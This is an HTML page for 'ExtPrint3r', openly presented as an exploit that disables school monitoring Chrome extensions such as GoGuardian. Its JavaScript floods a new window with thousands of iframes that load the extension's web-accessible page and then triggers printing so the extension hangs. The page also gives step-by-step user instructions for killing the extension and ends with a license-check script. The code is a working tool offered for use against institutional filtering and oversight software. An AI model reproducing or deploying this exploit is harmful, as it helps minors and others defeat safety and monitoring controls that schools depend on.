<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Skyline</title>
    <meta name="title" content="Skyline">
    <meta name="description" content="placeholder">
    <meta name="keywords" content="school blocker bypass, bypasser, bypass school, bypass blocker, securly bypass, goguardian bypass, hapara bypass, lightspeed bypass, lightspeed filter agent bypass, school unblocker, school blocker, unblocker, ext-remover, exthang3r, blobby-boi, ltmeat, ltbeef">
    <meta name="robots" content="index, follow">
    <meta name="language" content="English">
    <meta name="author" content="carbonical & Blobby Boi">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Skyline">
    <meta property="og:description" content="test">
    <meta property="twitter:card" content="summary_large_image">
    <link rel="shortcut icon" type="image/png" href=""> <!-- placeholder -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;display=swap" rel="stylesheet">

    <style>
    	@import url('"https://fonts.googleapis.com/css2?family=Roboto:ital,wght:@400;&display=swap');
	* {
	    font-family: "Inter", arial;
	}

    	body {
            background-color: #1e1f22;
            color: white;
            display: flex;
	    font-family: "Inter", arial;
            margin-left: 250px;
        }

    	.side-panel {
            position: fixed;
            top: 0;
            left: 0;
            width: 250px;
	    font-family: "Inter", arial;
            height: 100vh;
            background-color: #292a2d;
            color: white;
            display: flex;
            flex-direction: column;
            padding: 20px;
            border-right: 1px solid #444;
        }

        .side-panel img {
            width: 64px;
            height: 64px;
            margin-bottom: 20px;
	    user-select: none;
    	}

    	.side-panel h2 {
    	    font-weight: bold;
    	    margin-bottom: 40px;
	    user-select: none;
    	}

    	.side-panel .option {
	    position: relative;
	    overflow: hidden;
    	    margin: 10px 0;
            font-size: 18px;
            cursor: pointer;
            user-select: none;
            border-radius: 30px;
            height: 50px;
            display: flex;
    	    align-items: center;
            padding-left: 50px;
            margin-left: -50px;
    	}

    	.side-panel .option:hover {
            background-color: #38393b;
            color: white;
    	}

    	.side-panel .option.selected {
            background-color: #8ab4f8;
            color: black;
    	}

    	.side-panel footer {
            margin-top: auto;
            text-align: center;
            padding: 10px 0;
            font-size: 14px;
            color: #c4c7c5;
    	}

   	 .side-panel footer a {
            color: #9dbae9;
    	}

    	.side-panel footer a:hover {
            text-decoration: underline;
    	}

    	.main-content {
            flex-grow: 1;
            padding: 20px;
    	}

    	.extension-container {
            margin-left: 12px;
            margin-bottom: 12px;
            display: flex;
            flex-direction: column-reverse;
            align-items: flex-start;
            justify-content: space-between;
            gap: 10px;
            padding: 10px;
            border-radius: 10px;
	    font-family: "Inter", arial;
            width: 375px;
            height: 140px;
            position: relative;
            background: #292a2d;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    	}

    	.extension-info {
            display: flex;
            align-items: center;
            margin: 10px;
            gap: 8px;
            justify-content: flex-end;
    	}

    	.extension-name {
            font-size: 13px;
            color: white;
    	}

    	.extension-id {
            font-size: 13px;
            color: #c4c7c5;
            margin-left: 10px;
   	 }

   	.extension-container img {
            width: 40px;
            height: 40px;
   	}

    	button {
            background: transparent;
            color: #9dbae9;
            font-weight: bold;
            border: 1px solid #047db7;
            border-radius: 20px;
            width: 80px;
            height: 35px;
            padding: 7px 10px;
            cursor: pointer;
            align-self: flex-end;
            transition: background 0.2s ease-in-out;
            outline: none;
    	}

   	button:hover {
            background: #38393b;
   	}

    	a {
            color: #9dbae9;
    	}

    	h3 {
            margin-left: 35px;
            color: white;
            margin-top: 20px;
    	}

    	#div-container {
            display: flex;
            flex-wrap: wrap;
            margin-left: 20px;
            width: 100% - 20px;
    	}
    
    	#about-tab, #settings-tab {
    	    margin-left: 50px;
	}
    
    	#printer-tab {
    	    margin-left: 10px;
	}

	.ripple {
            position: absolute;
            border-radius: 100%;
            transform: scale(0);
            background: rgba(0, 0, 0, 0.2);
            animation: ripple-animation 0.2s linear;
            pointer-events: none;
        }

        @keyframes ripple-animation {
            to {
                transform: scale(2);
                opacity: 0;
            }
        }

	.switch {
    	    position: relative;
    	    display: inline-block;
    	    width: 33px;
    	    height: 20px;
	    margin-left: 10px;
	}

	.switch input {
    	    opacity: 0;
    	    width: 0;
    	    height: 0;
	}

	.slider {
    	    position: absolute;
    	    cursor: pointer;
    	    top: 0;
    	    left: 0;
    	    right: 0;
    	    bottom: 0;
    	    background-color: #444746;
    	    border-radius: 15px;
    	    border: 1.5px solid #8e918f;
    	    transition: background-color 0.1s ease-in-out, border-color 0.1s ease-in-out;
	}

	.slider:before {
    	    content: "";
    	    position: absolute;
    	    height: 12px;
    	    width: 12px;
    	    left: 4px;
    	    top: 50%;
    	    transform: translateY(-50%);
    	    background-color: #8e918f;
    	    border-radius: 50%;
    	    transition: transform 0.1s ease-in-out, background-color 0.1s ease-in-out;
	}

	.switch:hover .slider:before {
    	    box-shadow: 0 0 6px rgba(255, 255, 255, 0.5);
	}

	input:checked + .slider {
    	    background-color: #a8c7fa;
    	    border-color: #a8c7fa;
	}

	input:checked + .slider:before {
    	    transform: translate(12px, -50%);
    	    background-color: #062e6f;
	}

	#dev-settings {
	    margin-top: 15px;
	}

	#iframe-count {
	    margin-top: 15px; 
	    margin-left: 10px;
	    margin-right: 8px;
	    width: 200px;
    	    height: 8px;
    	    appearance: none;
    	    background: #444746;
    	    border: 1.5px solid #8e918f;
    	    border-radius: 15px;
    	    outline: none;
    	    transition: background-color 0.1s ease-in-out, border-color 0.1s ease-in-out;
	}

	#iframe-count::-webkit-slider-thumb {
    	    appearance: none;
    	    width: 20px;
    	    height: 20px;
    	    background: #8e918f;
    	    border-radius: 50%;
    	    cursor: pointer;
    	    transition: transform 0.1s ease-in-out, background-color 0.1s ease-in-out;
	}

	#iframe-count:hover::-webkit-slider-thumb {
    	    box-shadow: 0 0 6px rgba(255, 255, 255, 0.5);
	}

	#iframe-count:active::-webkit-slider-thumb {
    	    background: #a8c7fa;
	}

    	.contributor{
            margin-right: 5px;
   	}
    
    	.contributor>img{
            width: 55px;
            border-radius: 100%;
            border:solid #444 2px;
    	}
    
    </style>
</head>
<body>
    <div class="side-panel">
    	<div style="display: flex; align-items: center;">
            <img src="https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/icon.png" width="50px" height="50px" style="margin-right: 10px;">
            <h2>ExtPrint3r</h2>
    	</div>
        <div class="option" data-name="printer-tab">The Exploit</div>
        <div class="option" data-name="settings-tab">Settings</div>
        <div class="option" data-name="about-tab">About</div>
        <div style="border-top: 1px solid #444; margin-top: 10px; padding-top: 10px; width: 100%;"></div>
        <p style="text-align: center; margin-left: -10px; user-select: none;">Made by <a href="https://github.com/Blobby-Boi/" target="_blank">Blobby Boi</a></p>
    </div>
    <div class="main-content">
        <div id="printer-tab">
            <h3 style="user-select: none; font-weight: 400;">All Extensions</h3>
            <div id="div-container"></div>
	</div>
	<div id="about-tab" style="display: none;">
       	    <h2 style="user-select: none;">About ExtPrint3r</h2>
            <p style="user-select: none; line-height: 1.5;"><b>ExtPrint3r</b> is an exploit created by <a href="https://github.com/Blobby-Boi/" target="_blank">Blobby Boi</a> with the goal of being the successor to <b>ExtHang3r</b>. The exploit recreates the behavior of the <b>LTMEAT Print</b> method by flooding iframes and then printing the page. For whatever reason, printing a page with a ton of iframes hangs the embedded page rather than the host page. This is exactly what ExtPrint3r exploits, since it also works with extension pages (as long as they are under web_accessible_resources). This seems to be much more consistent than other extension-freezing methods, and it also lasts for a longer period of time.</p>
            <div style="border-top: 1px solid #444; margin-bottom: 10px; margin-top: 20px; padding-top: 10px; width: 100%;"></div>
            <div id="contributor-content" style="display:none;">
                <h3 style="margin-left: 5px">Contributors</h3>
                <div id="contributor-list"></div>
            </div>
    </div>
   	<div id="settings-tab" style="display: none;">
            <h2 style="user-select: none;">Settings</h2>
	    <label for="show-all-extensions" style="pointer-events: none;">Show All Extensions</label><input id="show-all-extensions" type="checkbox">
            <br>
            <label for="iframe-count">Amount of iframes</label><input type="range" min="100" max="10000" value="2500" step="100" id="iframe-count"><span id="iframe-count-display">2500</span>
            <div style="border-top: 1px solid #444; margin-bottom: 10px; margin-top: 20px; padding-top: 10px; width: 100%;"></div>
            <label for="developer-mode" style="pointer-events: none;">Developer Mode</label><input id="developer-mode" type="checkbox"><br>
            <div id="dev-settings" style="display: none;">
                <button style="min-width:240px;" id="add-ext">Temporarily Add Extension To List</button>
            </div>
        </div>
    </div>
    <script>
      (function () {
        const ua = navigator.userAgent;
        const chromeMatch = ua.match(/Chrome\/(\d+)/);

        if (chromeMatch && parseInt(chromeMatch[1], 10) >= 135) {
          const overlay = document.createElement('div');
          overlay.style.position = 'fixed';
          overlay.style.top = 0;
          overlay.style.left = 0;
          overlay.style.width = '100%';
          overlay.style.height = '100%';
          overlay.style.backgroundColor = '#1e1f22';
          overlay.style.zIndex = 9999;
          overlay.style.display = 'flex';
          overlay.style.flexDirection = 'column';
          overlay.style.alignItems = 'center';
          overlay.style.justifyContent = 'center';

          const message = document.createElement('h3');
          message.textContent = 'If you are seeing this message, you are on a ChromeOS version higher than 134 and therefore this exploit will not work for you.';
          message.style.color = 'white';
	  message.style.userSelect = 'none';

          const button = document.createElement('button');
          button.textContent = 'Click here to load it anyway';
          button.style.marginTop = '20px';
          button.style.display = 'block';
          button.style.marginLeft = 'auto';
          button.style.marginRight = 'auto';
          button.style.marginLeft = 'calc(50% - 100px)';
          button.style.width = '200px';
	  button.style.userSelect = 'none';

          button.addEventListener('click', () => {
            overlay.remove();
          });

          overlay.appendChild(message);
          overlay.appendChild(button);
          document.body.appendChild(overlay);
        }
      })();
    </script>
    <script>	    
        document.addEventListener("DOMContentLoaded", function () {
            document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
                let label = document.createElement("label");
                label.classList.add("switch");

                let slider = document.createElement("span");
                slider.classList.add("slider");

                checkbox.parentNode.insertBefore(label, checkbox);
                label.appendChild(checkbox);
                label.appendChild(slider);
            });
        });
	    
        let optionButtons = document.querySelectorAll(".option")
        function HideAll(){
            optionButtons.forEach(button=>{
                let dataName = button.getAttribute("data-name")
                document.getElementById(dataName).style.display = "none";
                button.classList.remove("selected");
            })
        }

        optionButtons.forEach((button)=>{
            let dataName = button.getAttribute("data-name")
            let thisButton = button;
            button.addEventListener("click", ()=>{
                HideAll()
                document.getElementById(dataName).style.display = "block";
    	        thisButton.classList.add("selected");
            })
        })
	    
	document.getElementById("show-all-extensions").addEventListener("change", function () {
   	    extContainer.innerHTML = "";
    	    createExtensionButtons();
	});
	    
	let devModeToggle = document.getElementById("developer-mode");
	devModeToggle.checked = false;

	devModeToggle.addEventListener("change", (ev) => {
    	    console.log("Dev Mode On: " + devModeToggle.checked);

    	    if (devModeToggle.checked) {
                devModeToggle.checked = confirm("Are you sure you want to enable developer mode? This is intended only for people who know what they are doing!");
                if (!devModeToggle.checked) {
                    document.getElementById("dev-settings").style.display = "none";
                    return;
                }
    	    } else {
                document.getElementById("dev-settings").style.display = "none";
                return;
            }

    	    document.getElementById("dev-settings").style.display = "block";

    	    document.getElementById("add-ext").addEventListener("click", async () => {
		this.blur();
                let name = prompt("Extension Name");
                let url = prompt("Frame URL (must be under web_accessible_resources)");
                console.log(url);
                let icon = prompt("Icon URL (optional)");

                let success = await TryAddExtension(name, icon, url);
                if (success) {
                    alert("Successfully added extension!");
                } else {
                    alert("Failed to add extension :(");
                }
            });
        });

	document.addEventListener('DOMContentLoaded', function() {
            document.querySelector("div.option").classList.add("selected");
	});

	document.querySelectorAll(".option").forEach(option => {
    	    option.addEventListener("click", function (e) {
        	this.querySelectorAll(".ripple").forEach(ripple => ripple.remove());

        	let ripple = document.createElement("span");
        	ripple.classList.add("ripple");

       		let rect = this.getBoundingClientRect();
        	let size = Math.max(rect.width, rect.height);
        	ripple.style.width = ripple.style.height = `${size}px`;

        	let x = e.clientX - rect.left - size / 2;
        	let y = e.clientY - rect.top - size / 2;
        	ripple.style.left = `${x}px`;
        	ripple.style.top = `${y}px`;

        	this.appendChild(ripple);

        	setTimeout(() => ripple.remove(), 600);
    	    });
	});
	    
	async function checkExtensionURL(url) {
    	    try {
        	const response = await fetch(url);
        	if (response.ok) return true;
            } catch (error) {
		    
	    }

    	    try {
                const response = await fetch(url, { method: 'HEAD' });
        	if (response.ok) return true;
    	    } catch (error) {
		    
	    }
		
    	    return false;
	}

        function getExtensionId(url) {
            const regex = /^chrome-extension:\/\/([^\/]+)/;
            const match = url.match(regex);
            return match ? match[1] : 'Unknown ID';
        }

        const extContainer = document.getElementById("div-container");
        async function TryAddExtension(name, icon, url){
	    let showAll = document.getElementById("show-all-extensions").checked;
		
            if (showAll || await checkExtensionURL(url)) {
                const div = document.createElement("div");
                div.classList.add("extension-container");

                const img = document.createElement("img");
                img.src = icon || "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
                img.onerror = function() {
                    this.src = "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
                };
                img.alt = `${name} Icon`;
		img.style.userSelect = "none";

                const infoDiv = document.createElement("div");
                infoDiv.classList.add("extension-info");

                const nameText = document.createElement("span");
                nameText.classList.add("extension-name");
                nameText.textContent = name;

                const idText = document.createElement("span");
                const extensionId = getExtensionId(url);
                idText.classList.add("extension-id");
                idText.textContent = `ID: ${extensionId}`;

                const button = document.createElement("button");
                button.textContent = "Disable";
		button.style.userSelect = "none";
                button.onclick = () => createPopup(name, icon, url, extensionId);

                infoDiv.appendChild(img);
                infoDiv.appendChild(nameText);
                div.appendChild(button);
                div.appendChild(idText);
                div.appendChild(infoDiv);
                extContainer.appendChild(div);
                    
                return true;
            }
        }

        const extensions = {
        	"GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
      	    };

      	    const icons = { // add more later
        	"GoGuardian": "data:image/png;base64,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",
      	    };

	async function createExtensionButtons() {
   	    let hasSupportedExtensions = false;

    	    for (const [name, url] of Object.entries(extensions)) {
                const success = await TryAddExtension(name, icons[name], url);
                if (success) hasSupportedExtensions = true;
    	    }

    	    if (!hasSupportedExtensions) {
                extContainer.innerHTML = "<p style='margin-left: 15px; font-size: 12px;'>No supported extensions installed :(</p>";
    	    }
	}
	
    	const iframeCountEl = document.querySelector("#iframe-count")
    	iframeCountEl.addEventListener("input", ()=>{
            document.querySelector("#iframe-count-display").textContent = iframeCountEl.value
   	})
	    
	function createIframesAndPrint(extPage, extIcon) {
    	    let printerWindow = window.open("", "_blank");
    	    printerWindow.document.title = 'T‍h‍e‍ ‍P‍r‍i‍n‍t‍3‍r';
    	    printerWindow.document.body.style.backgroundColor = '#1e1f22';

    	    let icon = printerWindow.document.createElement('link');
    	    icon.rel = 'icon';
    	    icon.href = extIcon;
    	    icon.type = 'image/x-icon';
    	    printerWindow.document.head.appendChild(icon);

    	    let printerBody = printerWindow.document.body;

    	    let loadingContainer = printerWindow.document.createElement("div");
    	    loadingContainer.style.position = "fixed";
    	    loadingContainer.style.top = "50%";
    	    loadingContainer.style.left = "50%";
    	    loadingContainer.style.transform = "translate(-50%, -50%)";
    	    loadingContainer.style.color = "white";
    	    loadingContainer.style.fontSize = "20px";
	    loadingContainer.style.fontFamily = "'Roboto', sans-serif";
    	    loadingContainer.style.textAlign = "center";

    	    let spinner = printerWindow.document.createElement("div");
    	    spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
	    spinner.style.borderTop = "4px solid white";
            spinner.style.borderRadius = "50%";
            spinner.style.width = "40px";
            spinner.style.height = "40px";
            spinner.style.animation = "spin 1s linear infinite";
            spinner.style.margin = "0 auto 10px";

            let loadingText = printerWindow.document.createElement("div");
    	    loadingText.innerText = "Loading...";

    	    loadingContainer.appendChild(spinner);
    	    loadingContainer.appendChild(loadingText);
    	    printerBody.appendChild(loadingContainer);

    	    let style = printerWindow.document.createElement("style");
            style.innerHTML = `
        	@keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
            	}
    	    `;
	    let script = printerWindow.document.createElement("script");
            script.innerHTML = `
            	setTimeout(() => {
                    window.close();
            	}, 5000);
            `;
	    printerWindow.document.head.appendChild(style);
            printerWindow.document.body.appendChild(script);

    	    setTimeout(() => {
        	for (let i = 0; i < iframeCountEl.value; i++) {
                    const iframe = document.createElement('iframe');
                    iframe.src = extPage;
                    iframe.width = "25px";
                    iframe.height = "25px";
                    iframe.style.border = "none";
                    printerBody.appendChild(iframe);
            	}
		    
        	loadingContainer.remove();
                printerWindow.print();
                let iframes = printerWindow.document.querySelectorAll("iframe");
                iframes.forEach(iframe => iframe.remove());
            }, 1000);
        }

        createExtensionButtons();
        
        function createPopup(extName, extIcon, extPage, extId) {
            const overlay = document.createElement("div");
            overlay.style.position = "fixed";
            overlay.style.top = "0";
            overlay.style.left = "0";
            overlay.style.width = "100vw";
            overlay.style.height = "100vh";
            overlay.style.background = "rgba(0, 0, 0, 0.6)";
            overlay.style.zIndex = "999";
            overlay.style.display = "flex";
            overlay.style.justifyContent = "center";
            overlay.style.alignItems = "center";

            const popup = document.createElement("div");
            popup.style.background = "#292a2d";
            popup.style.color = "white";
            popup.style.width = "500px";
            popup.style.borderRadius = "10px";
            popup.style.overflow = "hidden";
            popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.3)";
            popup.style.transition = "transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1)";

            const header = document.createElement("div");
            header.style.display = "flex";
            header.style.alignItems = "center";
            header.style.justifyContent = "space-between";
            header.style.background = "#1e1f22";
            header.style.padding = "10px";
            header.style.borderBottom = "1px solid #444";

            const icon = document.createElement("img");
            icon.src = extIcon || "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
	    icon.onerror = function() {
                this.src = "https://raw.githubusercontent.com/Blobby-Boi/ExtPrint3r/refs/heads/main/extension.png";
            };
            icon.style.width = "32px";
            icon.style.height = "32px";
            icon.style.marginLeft = "10px";
            icon.style.marginRight = "8px";
            icon.style.marginBottom = "5px";
            icon.style.marginTop = "5px";
            icon.style.userSelect = "none";

            const title = document.createElement("span");
            title.textContent = extName;
            title.style.userSelect = "none";

            const leftSection = document.createElement("div");
            leftSection.style.display = "flex";
            leftSection.style.alignItems = "center";
            leftSection.appendChild(icon);
            leftSection.appendChild(title);

            const x = document.createElement("span");
            x.textContent = "×";
            x.style.background = "transparent";
            x.style.color = "#9aa0a6";
            x.style.fontSize = "24px";
            x.style.marginRight = "-4px";
            x.style.marginTop = "-22px";
            x.style.cursor = "pointer";
            x.style.userSelect = "none";
            x.style.borderRadius = "50%";
            x.style.padding = "0";
            x.style.width = "32px";
            x.style.height = "32px";
            x.style.lineHeight = "32px";
            x.style.textAlign = "center";
            x.style.display = "inline-block";

            x.onmouseover = () => {
                x.style.backgroundColor = "rgba(255, 255, 255, 0.1)";
            };

            x.onmouseout = () => {
                x.style.backgroundColor = "transparent";
            };

            x.onclick = () => document.body.removeChild(overlay);

            header.appendChild(leftSection);
            header.appendChild(x);

            const instructions = document.createElement("p");
            const settingsUrl = "chrome://extensions?id=" + extId;
            instructions.innerHTML = "Open the following URL in a new tab:<br><br><span>" + settingsUrl + "</span><br><br> Then go back to this one and press the button below which will open a new tab. Immediately press ctrl+tab and start spamming the switch called \"Allow Access to file URLs\" for about 5 seconds. Once you are done, close that tab and switch to the other one. Then, press cancel on the print dialog and the tab should close. If done correctly, the extension " + extName + " should've been killed.";
            instructions.style.padding = "15px";
            instructions.style.textAlign = "center";

            const buttonContainer = document.createElement("div");
            buttonContainer.style.display = "flex";
            buttonContainer.style.justifyContent = "center";
            buttonContainer.style.padding = "10px";

            const printButton = document.createElement("button");
            printButton.textContent = "The Print3r";
            printButton.style.width = "100px";
            printButton.style.marginTop = "-15px";
            printButton.style.marginBottom = "15px";
            printButton.onclick = () => {
                createIframesAndPrint(extPage, extIcon);
		setTimeout(() => {
                    instructions.innerHTML = extName + ' has been killed!';
		    popup.removeChild(buttonContainer);
		}, 500);
            };

            buttonContainer.appendChild(printButton);

            overlay.onclick = (event) => {
                if (event.target === overlay) {
                    popup.style.transform = "scale(1.03)";
                    setTimeout(() => {
                        popup.style.transform = "scale(1)";
                    }, 200);
                }
            };

            popup.appendChild(header);
            popup.appendChild(instructions);
            popup.appendChild(buttonContainer);

            overlay.appendChild(popup);
            document.body.appendChild(overlay);
        }

        async function GetContributorData(){
            let contributors = await (await fetch("https://api.github.com/repos/Blobby-Boi/ExtPrint3r/contributors")).json()
            return contributors
        }
        const contributorList = document.querySelector("#contributor-list")
        async function DisplayContributors(){
            let contributors = await GetContributorData()

            for(let contributor of contributors){
                console.log(contributor.avatar_url, contributor.html_url, contributor.login)
                let a = document.createElement("a")
                a.href = contributor.html_url
                a.classList.add("contributor")

                let img = document.createElement("img")
                img.src = contributor.avatar_url
                a.appendChild(img)

                contributorList.appendChild(a)
            }

            document.querySelector("#contributor-content").style.display = "block"
        }
        DisplayContributors()
	
    </script>
  <script>
   // licensing check on page load
   window.onload = async function () {
      const AUTH_LIST_URL = "https://raw.githubusercontent.com/carbonical/Project-Skyline/main/auth-codes.json";

      // Retrieve the authorization code and expiry date from localStorage
      const storedAuthCode = localStorage.getItem('project_skyline_auth_code');
      const storedExpiryDate = localStorage.getItem('project_skyline_auth_expiry');
      const currentDate = new Date();

      // Check if the auth code and expiry date exist in localStorage
      if (storedAuthCode && storedExpiryDate) {
         const expiryDate = new Date(storedExpiryDate);

         // Compare the expiry date with the current date
         if (currentDate > expiryDate) {
            alert("Your license has expired.");
            window.location.href = "https://your-license-expired-page.com"; // Redirect to an expiration page or show an error message
            return;
         }

         // Fetch the list of valid authorization codes
         try {
            const response = await fetch(AUTH_LIST_URL);
            const authData = await response.json();

            // Validate if the stored code matches a valid one from the list
            if (authData[storedAuthCode] && !authData[storedAuthCode].revoked) {
               console.log("License is valid.");
               // Continue loading the page content
               return; // Valid license, proceed with page content
            } else {
               alert("Invalid or revoked authorization code.");
               window.location.href = "https://your-invalid-license-page.com"; // Redirect to an error page
               return;
            }
         } catch (error) {
            console.error("Error fetching auth data:", error);
            alert("An error occurred while validating your license.");
            window.location.href = "https://your-license-entry-page.com"; // Redirect to a page to enter the license code
            return;
         }
      } else {
         alert("License information missing. Please enter a valid license code.");
         window.location.href = "https://your-license-entry-page.com"; // Redirect to a page to enter the license code
         return;
      }
   };
  </script>
</body>
</html>
